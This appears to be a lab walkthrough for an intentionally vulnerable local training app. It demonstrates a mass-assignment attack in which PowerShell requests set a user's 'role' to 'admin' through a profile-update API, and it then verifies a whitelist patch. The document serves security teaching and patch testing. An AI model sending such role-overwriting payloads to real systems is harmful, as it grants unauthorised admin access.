# Walkthrough - CorpIntranet Profile Manager

This document outlines the verification steps for the CorpIntranet application, focusing on the Mass Assignment vulnerability.

## Prerequisites
- Docker and Docker Compose installed.
- Application running (`docker-compose up --build`).

## Verification Steps

### 1. Initial Login (Normal Behavior)
1. Open [http://localhost:5000](http://localhost:5000).
2. Login with default credentials:
   - **Username:** `jdoe`
   - **Password:** `password`
3. **Observe:**
   - You are redirected to the Dashboard.
   - The "Employee Dashboard" image is displayed (blue placeholder).
   - Role is displayed as `user`.

### 2. The Attack (Mass Assignment)
1. **Login via Browser:**
   - Login as `jdoe` / `password`.
   - Observe the "Employee Dashboard" image.

2. **Perform the Attack (Terminal):**
   - Open your terminal.
   - Execute the following command to simulate the attack (assuming you have the token, or just use the curl login flow):
   
   **Step 1: Login to get Token**
   ```bash
   # Windows PowerShell
   $response = Invoke-RestMethod -Uri http://localhost:5000/api/login -Method Post -Body '{"username":"jdoe", "password":"password"}' -ContentType "application/json"
   $token = $response.token
   Write-Host "Token: $token"
   ```

   **Step 2: Send Malicious Payload**
   ```bash
   # Use the token from above
   Invoke-RestMethod -Uri http://localhost:5000/api/profile/update -Method Post -Headers @{Authorization=$token} -Body '{"email": "hacker@evil.com", "role": "admin"}' -ContentType "application/json"
   ```

3. **Verify Result:**
   - Go back to the browser and refresh the page.
   - **Observe:**
     - The main image changes to "TOP SECRET / ADMIN CONTROL".
     - The Role is now displayed as `admin`.
     - **Conclusion:** The application blindly accepted the `role` field via the API.

### 3. Remediation Check (Verify Patch)
1. **Important**: Must delete the `instance/database.db` file before running the application again.
2. The vulnerability has been patched in `app.py` by whitelisting allowed fields.
3. **Attempt the Attack Again:**
   - Repeat the attack from Step 2.
   ```bash
   # Use the same token
   Invoke-RestMethod -Uri http://localhost:5000/api/profile/update -Method Post -Headers @{Authorization=$token} -Body '{"email": "hacker@evil.com", "role": "admin"}' -ContentType "application/json"
   ```
4. **Verify Result:**
   - Refresh the dashboard.
   - **Observe:**
     - The role remains `user`.
     - The image remains the "Employee Dashboard".
     - **Conclusion:** The patch successfully prevents the privilege escalation.
